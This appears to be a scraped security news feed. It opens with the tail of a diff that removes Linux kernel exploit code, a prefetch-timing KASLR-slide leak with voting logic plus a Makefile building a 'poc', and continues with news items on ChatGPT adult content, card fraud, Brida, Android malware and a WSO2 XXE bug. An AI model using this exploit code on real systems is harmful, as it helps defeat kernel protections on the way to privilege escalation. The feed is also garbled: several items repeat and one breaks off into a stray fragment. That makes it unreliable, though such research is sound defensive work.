-    if(ret != 0) error_out("[setup_pg_vec] ioctl");
-    close(fd);
-}
-
-#define MIN_KERNEL_BASE 0xffffffff80000000ULL
-#define MAX_KERNEL_BASE 0xffffffffc0000000ULL
-#define KERNEL_ALIGN 0x200000ULL
-
-u64 probe_entry_nokpti(u64 addr)
-{
-    uint64_t a, b, c, d;
-    asm volatile (".intel_syntax noprefix;"
-        "cpuid;"    // serialization
-
-        "rdtscp;"
-        "mov r12, rax;"
-        "mov r13, rdx;" // record the start timestamp into temporary registers to avoid cache miss
-
-        "prefetcht0 qword ptr [%4];"
-        "prefetcht0 qword ptr [%4];"
-        "prefetcht0 qword ptr [%4];"
-        "mfence;"   // do the prefetch
-
-        "rdtscp;"
-        "mov %2, rax;"
-        "mov %3, rdx;" // save the end timestamp
-
-        "mov %0, r12;"
-        "mov %1, r13;" // save the start timestamp
-
-        "mfence;" // make sure everything is saved correctly
-        ".att_syntax;"
-        : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
-        : "r" (addr)
-        : "rax", "rbx", "rcx", "rdx", "r12", "r13");
-    a = (b << 32) | a;
-    c = (d << 32) | c;
-    return c - a;
-}
-
-u64 _entrybleed_get_kaslr_slide_nopti()
-{
-    int len = (MAX_KERNEL_BASE-MIN_KERNEL_BASE-0x1000000)/KERNEL_ALIGN;
-    u64 *times = malloc(sizeof(u64)*len);
-    for(int i=0; i<len; i++) {
-        u64 probe_addr = MIN_KERNEL_BASE + i*KERNEL_ALIGN + 0x1000000;
-        u64 elapsed, sum=0;
-        int cnt = 0;
-        while (cnt < 1000) {
-            u64 tmp = probe_entry_nokpti(probe_addr);
-            if (tmp > 1000) continue; // likely because of interrupts
-            cnt += 1;
-            sum += tmp;
-        }
-        elapsed = sum;
-        //printf("addr: %#llx, probe: %#llx, elapsed: %#llx\n", 0, probe_addr, elapsed);
-        times[i] = elapsed;
-    }
-
-    // calculate the mean
-    u64 total = 0;
-    for(int i=0; i<len; i++) {
-        total += times[i];
-    }
-    double mean = total/len;
-
-    // calculate the std
-    double tmp = 0;
-    for(int i=0; i<len; i++) {
-        tmp += ((double)times[i]-mean)*((double)times[i]-mean);
-    }
-    tmp /= len;
-    double std = sqrt(tmp);
-
-    u64 bar = (u64)(mean-std);
-    for(int i=0; i<len; i++) {
-        if(times[i] < bar) {
-            free(times);
-            return i*KERNEL_ALIGN;
-        }
-    }
-    return -1;
-}
-
-struct entry {
-    u64 value;
-    int cnt;
-};
-
-struct entry *get_entry(struct entry *entries, int entry_cnt, u64 value)
-{
-    for (int i=0; i<entry_cnt; i++) {
-        if (entries[i].value == value) return &entries[i];
-    }
-    return NULL;
-}
-
-// do a major vote
-#define VOTE_CNT 10
-u64 entrybleed_get_kaslr_slide_nopti()
-{
-    u64 candidates[VOTE_CNT];
-    struct entry entries[VOTE_CNT];
-    int cnt = 0;
-    int entry_cnt = 0;
-
-    // obtain the results first
-    while(cnt < VOTE_CNT) {
-        u64 result = _entrybleed_get_kaslr_slide_nopti();
-        if (result == -1) continue;
-        candidates[cnt++] = result;
-        printf("slide candidate: %#llx\n", result);
-    }
-
-    // do count
-    for(int i=0; i<cnt; i++) {
-        u64 value = candidates[i];
-        struct entry *entry = get_entry(entries, entry_cnt, value);
-        if (entry == NULL) {
-            entries[entry_cnt].value = value;
-            entries[entry_cnt].cnt = 1;
-            entry_cnt++;
-        } else {
-            entry->cnt += 1;
-        }
-    }
-
-    // find the most common slide
-    u64 best_slide = -1;
-    int best_cnt = 0;
-
-    for(int i=0; i<entry_cnt; i++) {
-        if (entries[i].cnt < best_cnt) continue;
-        if (entries[i].cnt > best_cnt || entries[i].value < best_slide) {
-            best_slide = entries[i].value;
-            best_cnt = entries[i].cnt;
-        }
-    }
-    return best_slide;
-}
-
-static void __attribute__((constructor)) init(void)
-{
-    // disable buffering
-    setvbuf(stdin, NULL, _IONBF, 0);
-    setvbuf(stdout, NULL, _IONBF, 0);
-
-    // very bad random seed lol
-    srand(time(NULL));
-
-    // initialize parameters
-    cpu_num = sysconf(_SC_NPROCESSORS_ONLN);
-}# Makefile
-all:
-	gcc -D_FILE_OFFSET_BITS=64 fusefs.c `pkg-config fuse --cflags --libs` -o fusefs
-	gcc -static -o poc poc.c utils.c -lm
-
-clean:
-	rm poc
-	rm fusefs]]></content:encoded></item><item><title>NSFW ChatGPT? OpenAI plans “grown-up mode” for verified adults</title><link>https://www.malwarebytes.com/blog/news/2025/10/nsfw-chatgpt-openai-plans-grown-up-mode-for-verified-adults</link><author></author><category>threatintel</category><pubDate>Tue, 28 Oct 2025 11:39:22 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[If you’ve had your fill of philosophical discussions with ChatGPT, CEO Sam Altman has news for you: the service will soon be able to engage in far less highbrow conversations of the sexual kind. That’s right—sexting is coming to ChatGPT. Are we really surprised?It marks a change in sentiment for the company, which originally banned NSFW content. In an October 14 post on X, Altman said the company had kept ChatGPT “pretty restrictive” to avoid creating mental health issues for vulnerable users. But now, he says, the company has learned from that experience and feels ready to “experiment more.”“In a few weeks, we plan to put out a new version of ChatGPT that allows people to have a personality that behaves more like what people liked about 4o (we hope it will be better!). If you want your ChatGPT to respond in a very human-like way, or use a ton of emoji, or act like a friend, ChatGPT should do it (but only if you want it, not because we are usage-maxxing).”He added that by December, as age-gating expands, ChatGPT will “allow even more, like erotica for verified adults.”This isn’t a sudden pivot. Things started to change at least as far back as May last year, when the company said in its Model Specification document that it was considering allowing ChatGPT to get a little naughty under the right circumstances. “We believe developers and users should have the flexibility to use our services as they see fit, so long as they comply with our usage policies. We’re exploring whether we can responsibly provide the ability to generate NSFW content in age-appropriate contexts through the API and ChatGPT. We look forward to better understanding user and societal expectations of model behavior in this area.”It followed up on that with another statement in a February 2025 update to the document, when it starting mulling a ‘grown-up mode’ while drawing a hard boundary around things like age, sexual deepfakes, and revenge porn.There’s no denying the money behind this move. Analysts believe people paid $2.7 billion worldwide for a little AI companionship last year, with the market expected to balloon to $24.5 billion by 2034—a staggering 24% annual growth rate.AI “girlfriends” and “boyfriends” already span everything from video-based virtual partners to augmented reality companions that can call you. Even big tech companies have been getting into it, with Elon Musk’s X launching a sexualized virtual companion called Ani that will apparently strip for you if you pester it enough.People have been getting down and dirty with technology for decades, of course (phone sex lines began in the early 1980s, and cam sites have been a thing for years). But AI changes the scale entirely. There’s no limit to automation, no need for human operators, and no guarantee that the users on the other side know where the boundaries are.We’re not judging, but the normal rules apply. This stuff is supposed to be for adults, which makes it more important than ever that parents monitor what their kids access online. It wasn’t the first time, either. Back in 2024, another AI girlfriend platform was breached, leaking users’ fantasies, chat histories, and profile data. That story showed just how vulnerable these apps can be when they mix emotional intimacy with poor security hygiene.As AI companionship becomes mainstream, breaches like these raise tough questions about how safely this kind of data can ever really be stored.For adults wanting a little alone time with an AI, remember to take a regular break and a sanity check. While Altman might think that OpenAI has “been able to mitigate the serious mental health issues,” experts still warn that relationships with increasingly lifelike AIs can create very real emotional risks. We don’t just report on privacy—we offer you the option to use it.]]></content:encoded></item><item><title>US declines to join more than 70 countries in signing UN cybercrime treaty</title><link>https://databreaches.net/2025/10/28/us-declines-to-join-more-than-70-countries-in-signing-un-cybercrime-treaty/?pk_campaign=feed&amp;pk_kwd=us-declines-to-join-more-than-70-countries-in-signing-un-cybercrime-treaty</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 28 Oct 2025 11:19:34 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Social Engineering People’s Credit Card Details</title><link>https://www.schneier.com/blog/archives/2025/10/social-engineering-peoples-credit-card-details.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Tue, 28 Oct 2025 11:01:20 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Your highway toll payment is now past due, one text warns. You have U.S. Postal Service fees to pay, another threatens. You owe the New York City Department of Finance for unpaid traffic violations.The texts are ploys to get unsuspecting victims to fork over their credit-card details. The gangs behind the scams take advantage of this information to buy iPhones, gift cards, clothing and cosmetics.Criminal organizations operating out of China, which investigators blame for the toll and postage messages, have used them to make more than $1 billion over the last three years, according to the Department of Homeland Security.Making the fraud possible: an ingenious trick allowing criminals to install stolen card numbers in Google and Apple Wallets in Asia, then share the cards with the people in the U.S. making purchases half a world away.]]></content:encoded></item><item><title>Brida (Burp-Frida Bridge) 0.6 released! - HN Security</title><link>https://hnsecurity.it/blog/brida-0-6-released/</link><author>/u/0xdea</author><category>netsec</category><pubDate>Tue, 28 Oct 2025 10:35:05 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Recently, Ole André Vadla Ravnås (@oleavr) & his team made some breaking changes to their great Fridadynamic instrumentation toolkit, removing Java, ObjC, and Swift runtime bridges from Frida’s GumJS runtime and removing or refactoring many JS APIs used by most Frida-based tools (like Brida). Consequently, many functionalities of Brida broke and required some changes to work properly with the latest Frida versions. I just released a new version of Brida (0.6) that is fully compatible with the latest versions of Frida and frida-compile.As a downside, starting with version 0.6, Brida will not be compatible with older Frida versions (<17). Unfortunately, as anyone who has worked with Frida on physical Android or iOS devices likely knows, it often happens that a specific version of Frida doesn’t work on a particular device, and in such situations an older Frida version could be useful. For such scenarios, I will leave version 0.6pre of Brida available in the Releases section of the GitHub repository. This version works with frida-compile@10.2.5 and frida<17.Some highlights on the updates brought by the last Brida version: to reflect changes in frida >= 17 (17.3.2 at the time of the release).Fixed compatibility with the last frida-compile versions (19.0.4 at the time of the release). to work with the last Java versions.Added “Host:Port” and “DeviceId” Frida connection modes.Added JS bypass for OkHttpHostname Verified.Added Gradle build configuration file.Improved Android root detection script.Finally, some direct links:]]></content:encoded></item><item><title>Is Your Google Workspace as Secure as You Think it is?</title><link>https://thehackernews.com/2025/10/is-your-google-workspace-as-secure-as.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyefAwM_xLJ_3Su0-Eqr3MGmfs-wjuOGIjuyyR3Adh4daM2ho6_h6VZVGAVSON8AzQQbskUSrJuBavVYRyKBYFC6AhdHQRqgwpAhebsB179jetDhl-MJl8ZUuE-mSQbBYp4h0ewYpZC7-D5oxWVWTMWmU8Dqc2sK0Tt5_gvOySGgR7umpGc-yJZfWnQ8o/s1600/unnamed.png" length="" type=""/><pubDate>Tue, 28 Oct 2025 10:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The New Reality for Lean Security Teams
+Companies that treat cybersecurity as a]]></content:encoded></item><item><title>New Ubuntu Kernel LPE!</title><link>https://ssd-disclosure.com/lpe-via-refcount-imbalance-in-the-af_unix-of-ubuntus-kernel/</link><author>/u/SSDisclosure</author><category>netsec</category><pubDate>Tue, 28 Oct 2025 11:44:40 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>NSFW ChatGPT? OpenAI plans “grown-up mode” for verified adults</title><link>https://www.malwarebytes.com/blog/news/2025/10/nsfw-chatgpt-openai-plans-grown-up-mode-for-verified-adults</link><author></author><category>threatintel</category><pubDate>Tue, 28 Oct 2025 11:39:22 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[If you’ve had your fill of philosophical discussions with ChatGPT, CEO Sam Altman has news for you: the service will soon be able to engage in far less highbrow conversations of the sexual kind. That’s right—sexting is coming to ChatGPT. Are we really surprised?It marks a change in sentiment for the company, which originally banned NSFW content. In an October 14 post on X, Altman said the company had kept ChatGPT “pretty restrictive” to avoid creating mental health issues for vulnerable users. But now, he says, the company has learned from that experience and feels ready to “experiment more.”“In a few weeks, we plan to put out a new version of ChatGPT that allows people to have a personality that behaves more like what people liked about 4o (we hope it will be better!). If you want your ChatGPT to respond in a very human-like way, or use a ton of emoji, or act like a friend, ChatGPT should do it (but only if you want it, not because we are usage-maxxing).”He added that by December, as age-gating expands, ChatGPT will “allow even more, like erotica for verified adults.”This isn’t a sudden pivot. Things started to change at least as far back as May last year, when the company said in its Model Specification document that it was considering allowing ChatGPT to get a little naughty under the right circumstances. “We believe developers and users should have the flexibility to use our services as they see fit, so long as they comply with our usage policies. We’re exploring whether we can responsibly provide the ability to generate NSFW content in age-appropriate contexts through the API and ChatGPT. We look forward to better understanding user and societal expectations of model behavior in this area.”It followed up on that with another statement in a February 2025 update to the document, when it starting mulling a ‘grown-up mode’ while drawing a hard boundary around things like age, sexual deepfakes, and revenge porn.There’s no denying the money behind this move. Analysts believe people paid $2.7 billion worldwide for a little AI companionship last year, with the market expected to balloon to $24.5 billion by 2034—a staggering 24% annual growth rate.AI “girlfriends” and “boyfriends” already span everything from video-based virtual partners to augmented reality companions that can call you. Even big tech companies have been getting into it, with Elon Musk’s X launching a sexualized virtual companion called Ani that will apparently strip for you if you pester it enough.People have been getting down and dirty with technology for decades, of course (phone sex lines began in the early 1980s, and cam sites have been a thing for years). But AI changes the scale entirely. There’s no limit to automation, no need for human operators, and no guarantee that the users on the other side know where the boundaries are.We’re not judging, but the normal rules apply. This stuff is supposed to be for adults, which makes it more important than ever that parents monitor what their kids access online. It wasn’t the first time, either. Back in 2024, another AI girlfriend platform was breached, leaking users’ fantasies, chat histories, and profile data. That story showed just how vulnerable these apps can be when they mix emotional intimacy with poor security hygiene.As AI companionship becomes mainstream, breaches like these raise tough questions about how safely this kind of data can ever really be stored.For adults wanting a little alone time with an AI, remember to take a regular break and a sanity check. While Altman might think that OpenAI has “been able to mitigate the serious mental health issues,” experts still warn that relationships with increasingly lifelike AIs can create very real emotional risks. We don’t just report on privacy—we offer you the option to use it.]]></content:encoded></item><item><title>US declines to join more than 70 countries in signing UN cybercrime treaty</title><link>https://databreaches.net/2025/10/28/us-declines-to-join-more-than-70-countries-in-signing-un-cybercrime-treaty/?pk_campaign=feed&amp;pk_kwd=us-declines-to-join-more-than-70-countries-in-signing-un-cybercrime-treaty</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 28 Oct 2025 11:19:34 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Social Engineering People’s Credit Card Details</title><link>https://www.schneier.com/blog/archives/2025/10/social-engineering-peoples-credit-card-details.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Tue, 28 Oct 2025 11:01:20 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Your highway toll payment is now past due, one text warns. You have U.S. Postal Service fees to pay, another threatens. You owe the New York City Department of Finance for unpaid traffic violations.The texts are ploys to get unsuspecting victims to fork over their credit-card details. The gangs behind the scams take advantage of this information to buy iPhones, gift cards, clothing and cosmetics.Criminal organizations operating out of China, which investigators blame for the toll and postage messages, have used them to make more than $1 billion over the last three years, according to the Department of Homeland Security.Making the fraud possible: an ingenious trick allowing criminals to install stolen card numbers in Google and Apple Wallets in Asia, then share the cards with the people in the U.S. making purchases half a world away.]]></content:encoded></item><item><title>Brida (Burp-Frida Bridge) 0.6 released! - HN Security</title><link>https://hnsecurity.it/blog/brida-0-6-released/</link><author>/u/0xdea</author><category>netsec</category><pubDate>Tue, 28 Oct 2025 10:35:05 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Recently, Ole André Vadla Ravnås (@oleavr) & his team made some breaking changes to their great Fridadynamic instrumentation toolkit, removing Java, ObjC, and Swift runtime bridges from Frida’s GumJS runtime and removing or refactoring many JS APIs used by most Frida-based tools (like Brida). Consequently, many functionalities of Brida broke and required some changes to work properly with the latest Frida versions. I just released a new version of Brida (0.6) that is fully compatible with the latest versions of Frida and frida-compile.As a downside, starting with version 0.6, Brida will not be compatible with older Frida versions (<17). Unfortunately, as anyone who has worked with Frida on physical Android or iOS devices likely knows, it often happens that a specific version of Frida doesn’t work on a particular device, and in such situations an older Frida version could be useful. For such scenarios, I will leave version 0.6pre of Brida available in the Releases section of the GitHub repository. This version works with frida-compile@10.2.5 and frida<17.Some highlights on the updates brought by the last Brida version: to reflect changes in frida >= 17 (17.3.2 at the time of the release).Fixed compatibility with the last frida-compile versions (19.0.4 at the time of the release). to work with the last Java versions.Added “Host:Port” and “DeviceId” Frida connection modes.Added JS bypass for OkHttpHostname Verified.Added Gradle build configuration file.Improved Android root detection script.Finally, some direct links:]]></content:encoded></item><item><title>Is Your Google Workspace as Secure as You Think it is?</title><link>https://thehackernews.com/2025/10/is-your-google-workspace-as-secure-as.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyefAwM_xLJ_3Su0-Eqr3MGmfs-wjuOGIjuyyR3Adh4daM2ho6_h6VZVGAVSON8AzQQbskUSrJuBavVYRyKBYFC6AhdHQRqgwpAhebsB179jetDhl-MJl8ZUuE-mSQbBYp4h0ewYpZC7-D5oxWVWTMWmU8Dqc2sK0Tt5_gvOySGgR7umpGc-yJZfWnQ8o/s1600/unnamed.png" length="" type=""/><pubDate>Tue, 28 Oct 2025 10:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The New Reality for Lean Security Teams
 If you’re the first security or IT hire at a fast-growing startup, you’ve likely inherited a mandate that’s both simple and maddeningly complex: secure the business without slowing it down.
 Most organizations using Google Workspace start with an environment built for collaboration, not resilience. Shared drives, permissive settings, and constant]]></content:encoded></item><item><title>A phishing with invisible characters in the subject line, (Tue, Oct 28th)</title><link>https://isc.sans.edu/diary/rss/32428</link><author></author><category>threatintel</category><pubDate>Tue, 28 Oct 2025 10:12:32 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[While reviewing malicious messages that were delivered to our handler inbox over the past few days, I noticed that the “subject” of one phishing e-mail looked quite strange when displayed in the Outlook message list…]]></content:encoded></item><item><title>New Herodotus Android malware fakes human typing to avoid detection</title><link>https://www.bleepingcomputer.com/news/security/new-herodotus-android-malware-fakes-human-typing-to-avoid-detection/</link><author>Bill Toulas</author><category>security</category><pubDate>Tue, 28 Oct 2025 10:00:00 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A new Android malware family, Herodotus, uses random delay injection in its input routines to mimic human behavior on mobile devices and evade timing-based detection by security software. [...]]]></content:encoded></item><item><title>404 to arbitrary file read in WSO2 API Manager (CVE-2025-2905)</title><link>https://crnkovic.dev/wso2-404-to-arbitrary-file-read/</link><author>/u/crnkovic_</author><category>netsec</category><pubDate>Tue, 28 Oct 2025 08:37:57 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[ is a blind XXE vulnerability in WSO2 API Manager and other WSO2 products dependent on WSO2-Synapse.This is the first bug I found in WSO2 software. As you will see from posts in this series that follow this, it's hardly my most impactful find, but it was one of the more unexpected. That's mainly because of where it first showed up: a web server's default 404 response.WSO2 makes enterprise web application software. They have many products, most of which share a common codebase.This vulnerability impacts at least six WSO2 products. However, the subject of this post will be , as this is where I first discovered the bug, and it happens to be one of WSO2's more popular products.WSO2 API Manager is an API gateway and lifecycle management platform. It's sometimes compared to Kong or Apigee.In API Manager, there are two main components: the management console and the API gateway. This vulnerability affects . On the gateway, WSO2 API Manager brings in HTTP requests and forwards them to backend API servers. Common web servers like nginx and Apache can of course do the same thing; however, WSO2 adds features like authentication, rate limiting, and, most importantly, a fancy point-and-click user interface for teams to deploy and manage their APIs, i.e., the management console.WSO2 API Manager is built on top of Apache Synapse, a Java mediation framework and part of the Apache Axis2 ecosystem. However, WSO2 uses their own forks of these Apache dependencies, which introduces miscellaneous features used only by the WSO2 product family.WSO2's very insecure 404 Not FoundIn WSO2 API Manager, when you request a path that doesn't exist, you will receive a 404 response that looks like this:<am:fault xmlns:am="http://wso2.org/apimanager">
     <am:code>404</am:code>
